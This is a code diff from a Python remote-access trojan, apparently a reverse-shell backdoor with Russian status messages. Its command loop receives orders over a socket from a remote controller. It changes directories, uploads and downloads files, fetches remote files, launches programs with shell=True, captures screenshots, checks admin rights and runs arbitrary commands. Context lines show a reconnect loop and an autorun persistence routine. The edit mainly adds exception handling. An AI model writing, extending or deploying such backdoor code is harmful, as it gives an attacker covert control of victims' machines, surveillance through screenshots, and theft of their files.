@@ -96,36 +96,40 @@ def execute_command(sock, command):
 
 def shell(sock):
     while True:
-        command = reliable_recv(sock)
-        if command == "q":
-            sock.close()
+        try:
+            command = reliable_recv(sock)
+            if command == "q":
+                sock.close()
+                sys.exit(0)
+                
+            elif command.startswith("cd"):
+                try:
+                    os.chdir(command[3:])
+                    reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
+                except Exception as e:
+                    reliable_send(f"[!!] Ошибка: {e}", sock)
+            elif command.startswith("download"):
+                upload(sock, command[9:])
+            elif command.startswith("upload"):
+                save_file(sock, command[7:])
+            elif command.startswith("get"):
+                result = download(command[4:])
+                reliable_send(result, sock)
+            elif command.startswith("start"):
+                try:
+                    subprocess.Popen(command[6:], shell=True)
+                    reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
+                except Exception as e:
+                    reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
+            elif command.startswith("screenshot"):
+                screenshot_data = screenshot()
+                reliable_send(screenshot_data.decode(), sock)
+            elif command.startswith("check"):
+                is_admin(sock)
+            else:
+                execute_command(sock, command)
+        except:
             break
-        elif command.startswith("cd"):
-            try:
-                os.chdir(command[3:])
-                reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
-            except Exception as e:
-                reliable_send(f"[!!] Ошибка: {e}", sock)
-        elif command.startswith("download"):
-            upload(sock, command[9:])
-        elif command.startswith("upload"):
-            save_file(sock, command[7:])
-        elif command.startswith("get"):
-            result = download(command[4:])
-            reliable_send(result, sock)
-        elif command.startswith("start"):
-            try:
-                subprocess.Popen(command[6:], shell=True)
-                reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
-            except Exception as e:
-                reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
-        elif command.startswith("screenshot"):
-            screenshot_data = screenshot()
-            reliable_send(screenshot_data.decode(), sock)
-        elif command.startswith("check"):
-            is_admin(sock)
-        else:
-            execute_command(sock, command)
 
 
 def connection():
@@ -137,6 +141,8 @@ def connection():
             sock.close()
         except socket.error:
             time.sleep(5)
+        except:
+            break
 
 
 def setup_autorun():
